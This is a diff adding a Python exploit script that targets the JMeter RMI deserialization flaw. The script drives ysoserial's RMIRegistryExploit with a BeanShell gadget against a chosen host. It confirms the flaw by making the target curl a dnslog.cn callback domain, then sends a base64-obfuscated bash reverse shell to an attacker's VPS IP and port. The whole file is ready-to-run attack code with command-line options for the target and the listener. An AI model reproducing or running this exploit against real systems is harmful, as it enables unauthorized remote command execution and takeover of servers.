@@ -1,0 +1,82 @@
+#!/usr/bin/python3
+# -*- coding: UTF-8 -*-
+"""
+@Author  : xDroid
+@File    : JmeterRMI.py
+@Time    : 2020/7/9
+"""
+import sys
+import subprocess
+import requests
+import time
+from hashlib import md5
+import random
+import optparse
+import base64
+
+
+class JMeter:
+    def __init__(self,host,rhost,rport):
+        self.host = host
+        self.rhost = rhost
+        self.rport = rport
+        self.header={'cookie': 'UM_distinctid=17333bd886662-037f6fda493dae-4c302372-100200-17333bd8867b; CNZZDATA1278305074=612386535-1594299183-null%7C1594299183; PHPSESSID=drh67vlau4chdn44eadh0m16a0',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0'}
+        self.JmeterRMIpoc()
+
+    def randmd5(self):
+        new_md5 = md5()
+        new_md5.update(str(random.randint(1, 1000)).encode())
+        return new_md5.hexdigest()[:6]
+
+    def RMIRegistryExploit(self,command):
+        cmd = 'java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit %s 1099 BeanShell1 "%s"'%(self.host,command)
+        try:
+            subprocess.Popen(cmd, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        except:
+            print('ysoserial利用失败')
+            sys.exit(0)
+            
+    def JmeterRMIpoc(self):
+        print("[+]探测主机是否存在Jmeter RMI反序列化命令执行漏洞")
+        rand = self.randmd5()
+        getDoMain = 'http://www.dnslog.cn/getdomain.php'
+        r = requests.get(getDoMain,headers=self.header, timeout=5)
+        if r.status_code==200:
+            dnslogUrl =rand +'.'+r.text
+        else:
+            sys.exit()
+        command = "curl " +dnslogUrl
+        self.RMIRegistryExploit(command)
+        time.sleep(5)
+        getRecords='http://www.dnslog.cn/getrecords.php'
+        re =requests.get(getRecords,headers=self.header,timeout=5)
+        if re.status_code==200:
+            if rand in re.text:
+                print('[+]存在Jmeter RMI反序列化命令执行')
+                self.JmeterRMIexp()
+            else:
+                print('没有回显，POC验证失败')
+                sys.exit(0)
+        else:
+            print('没有访问dnslog地址，POC验证失败')
+            sys.exit(0)
+
+    def JmeterRMIexp(self):
+        print("Jmeter RMI反序列化命令执行")
+        shell = 'bash -i >&/dev/tcp/%s/%s 0>&1'%(self.rhost,self.rport)
+        shellbase64=base64.b64encode(shell.encode()).decode()
+        shellencode = 'bash -c {echo,'+shellbase64+'}|{base64,-d}|{bash,-i}'
+        try:
+            self.RMIRegistryExploit(shellencode)
+            print("Jmeter RMI反序列化命令执行完成")
+        except:
+            sys.exit(0)
+
+if __name__ == '__main__':
+    parser = optparse.OptionParser('python3 %prog'+'-h')
+    parser.add_option('-u',dest='host',type='str',help='target IP')
+    parser.add_option('-r',dest='rhost',type=str,help='vps IP')
+    parser.add_option('-p',dest='rport',type=str,help='vps port')
+    (options,args)=parser.parse_args()
+    JMeter(options.host,options.rhost,options.rport)
